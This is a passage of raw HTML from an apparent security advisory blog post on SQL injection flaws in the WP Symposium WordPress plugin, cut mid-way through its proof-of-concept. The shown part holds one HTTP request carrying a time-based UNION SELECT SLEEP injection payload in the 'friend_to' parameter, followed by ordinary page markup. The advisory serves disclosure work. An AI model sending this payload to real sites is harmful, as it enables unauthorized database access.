id="crayon-53c98785eff35236535183-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff35236535183-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">76</span></div><div class="crayon-line" id="crayon-53c98785eff35236535183-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff35236535183-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">addFriend</span><span class="crayon-o">&amp;</span><span class="crayon-v">friend_to</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-st">AND</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-e">SLEEP</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">--</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0051 seconds] -->
+<p><strong> </strong></p>
+					</div><!-- .entry-content -->
+
+	<footer class="entry-meta">
+				This entry was tagged <a href="http://ceriksen.com/tag/sql-injection/" rel="tag">SQL Injection</a>, <a href="http://ceriksen.com/tag/symposium/" rel="tag">Symposium</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>. Bookmark the <a href="http://ceriksen.com/2013/02/18/wp-symposium-multiple-sql-injection/" title="Permalink to WP Symposium multiple SQL injection vulnerabilities" rel="bookmark">permalink</a>.
+					</footer><!-- .entry-meta -->
+</article><!-- #post-132 -->
+
+					<nav id="nav-below">
+		<h2 class="assistive-text">Post navigation</h2>
+
+		
+					<div class="nav-previous"><a href="http://ceriksen.com/2013/01/27/vulnerability-chaining-magic-quotes-bypass-with-hexadecimal-literals-and-data-exfiltration/" rel="prev"><span class="meta-nav">&larr;</span> Vulnerability chaining, magic quotes bypass with hexadecimal literals and data exfiltration</a></div>			<div class="nav-next"><a href="http://ceriksen.com/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/" rel="next">WordPress Online Store arbitrary file disclosure <span class="meta-nav">&rarr;</span></a></div>						
+	
+	</nav><!-- #nav-below -->
+	
+						<div id="comments">
+	
+	
+	
+									<div id="respond" class="comment-respond">
+				<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2013/02/18/wp-symposium-multiple-sql-injection/#respond" style="display:none;">Cancel reply</a></small></h3>
+									<p class="must-log-in">You must be <a href="http://ceriksen.com/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2013%2F02%2F18%2Fwp-symposium-multiple-sql-injection%2F">logged in</a> to post a comment.</p>												</div><!-- #respond -->
+			
+</div><!-- #comments -->
+
+			
+			</div><!-- #content -->
+		</div><!-- #primary -->
+
+			<div id="secondary" class="widget-area" role="complementary">
+			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
+SA51348<br />
+SA51344<br />
+SA51336 </p>
+</div>
+		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
+	<li class="cat-item cat-item-3"><a href="http://ceriksen.com/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
+</li>
+	<li class="cat-item cat-item-12"><a href="http://ceriksen.com/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
+</li>
+	<li class="cat-item cat-item-30"><a href="http://ceriksen.com/category/security/" title="View all posts filed under Security">Security</a> (7)
+</li>
+		</ul>
+</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
+					<li>
+				<a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
+						</li>
+				</ul>
+		</aside>		</div><!-- #secondary .widget-area -->
+	
+	</div><!-- #main -->
+	
+	
+	<footer id="colophon" role="contentinfo">
+		<div id="site-generator">
+						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
+					
+		</div>
+	</footer><!-- #colophon -->
+	
+		
+</div><!-- #page -->
+
+<link rel='stylesheet' id='wp-jquery-ui-dialog-css'  href='http://ceriksen.com/wp-includes/css/jquery-ui-dialog.min.css?ver=3.8.3' type='text/css' media='all' />
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wordCountL10n = {"type":"w"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-admin/js/word-count.min.js?ver=3.8.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.core.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.widget.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.mouse.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.resizable.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.draggable.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.button.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.position.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.dialog.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/plugins/wpdialogs/js/wpdialog.min.js?ver=3.8.3'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpLinkL10n = {"title":"Insert\/edit link","update":"Update","save":"Add Link","noTitle":"(no title)","noMatchesFound":"No matches found."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/wplink.min.js?ver=3.8.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/plugins/wpdialogs/js/popup.min.js?ver=3.8.3'></script>
+
+	<script type="text/javascript">
+		tinyMCEPreInit = {
+			base : "",
+			suffix : "",
+			query : "ver=359-20131026",
+			mceInit : {},
+			qtInit : {'comment':{id:"comment",buttons:"strong,em,link,block,del,ins,img,ul,ol,li,code,more,close"}},
+			ref : {plugins:"",theme:"advanced",language:""},
+			load_ext : function(url,lang){var sl=tinymce.ScriptLoader;sl.markDone(url+'/langs/'+lang+'.js');sl.markDone(url+'/langs/'+lang+'_dlg.js');}
+		};
+	</script>
+
+	<script type="text/javascript">
+		var wpActiveEditor;
+
+		(function(){
+			var init, ed, qt, first_init, DOM, el, i, mce = 0;
+
+			if ( typeof(tinymce) == 'object' ) {
+				DOM = tinymce.DOM;
+				// mark wp_theme/ui.css as loaded
+				DOM.files[tinymce.baseURI.getURI() + '/themes/advanced/skins/wp_theme/ui.css'] = true;
+
+				DOM.events.add( DOM.select('.wp-editor-wrap'), 'mousedown', function(e){
+					if ( this.id )
+						wpActiveEditor = this.id.slice(3, -5);
+				});
+
+				for ( ed in tinyMCEPreInit.mceInit ) {
+					if ( first_init ) {
+						init = tinyMCEPreInit.mceInit[ed] = tinymce.extend( {}, first_init, tinyMCEPreInit.mceInit[ed] );
+					} else {
+						init = first_init = tinyMCEPreInit.mceInit[ed];
+					}
+
+					if ( mce )
+						try { tinymce.init(init); } catch(e){}
+				}
+			} else {
+				if ( tinyMCEPreInit.qtInit ) {
+					for ( i in tinyMCEPreInit.qtInit ) {
+						el = tinyMCEPreInit.qtInit[i].id;
+						if ( el )
+							document.getElementById('wp-'+el+'-wrap').onmousedown = function(){ wpActiveEditor = this.id.slice(3, -5); }
+					}
+				}
+			}
+
+			if ( typeof(QTags) == 'function' ) {
+				for ( qt in tinyMCEPreInit.qtInit ) {
+					try { quicktags( tinyMCEPreInit.qtInit[qt] ); } catch(e){}
+				}
+			}
+		})();
+		var ajaxurl = "/wp-admin/admin-ajax.php";		</script>
+			<div style="display:none;">
+	<form id="wp-link" tabindex="-1">
+	<input type="hidden" id="_ajax_linking_nonce" name="_ajax_linking_nonce" value="a25a108328" />	<div id="link-selector">
+		<div id="link-options">
+			<p class="howto">Enter the destination URL</p>
+			<div>
+				<label><span>URL</span><input id="url-field" type="text" name="href" /></label>
+			</div>
+			<div>
+				<label><span>Title</span><input id="link-title-field" type="text" name="linktitle" /></label>
+			</div>
+			<div class="link-target">
+				<label><input type="checkbox" id="link-target-checkbox" /> Open link in a new window/tab</label>
+			</div>
+		</div>
+				<p class="howto toggle-arrow " id="internal-toggle">Or link to existing content</p>
+		<div id="search-panel" style="display:none">
+			<div class="link-search-wrapper">
+				<label>
+					<span class="search-label">Search</span>
+					<input type="search" id="search-field" class="link-search-field" autocomplete="off" />
+					<span class="spinner"></span>
+				</label>
+			</div>
+			<div id="search-results" class="query-results">
+				<ul></ul>
+				<div class="river-waiting">
+					<span class="spinner"></span>
+				</div>
+			</div>
+			<div id="most-recent-results" class="query-results">
+				<div class="query-notice"><em>No search term specified. Showing recent items.</em></div>
+				<ul></ul>
+				<div class="river-waiting">
+					<span class="spinner"></span>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="submitbox">
+		<div id="wp-link-update">
+			<input type="submit" value="Add Link" class="button-primary" id="wp-link-submit" name="wp-link-submit">
+		</div>
+		<div id="wp-link-cancel">
+			<a class="submitdelete deletion" href="#">Cancel</a>
+		</div>
+	</div>
+	</form>
+	</div>
+	
+</body>
+</html>
+<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/
+
+Page Caching using disk: enhanced
+
+ Served from: ceriksen.com @ 2014-07-18 20:45:58 by W3 Total Cache -->
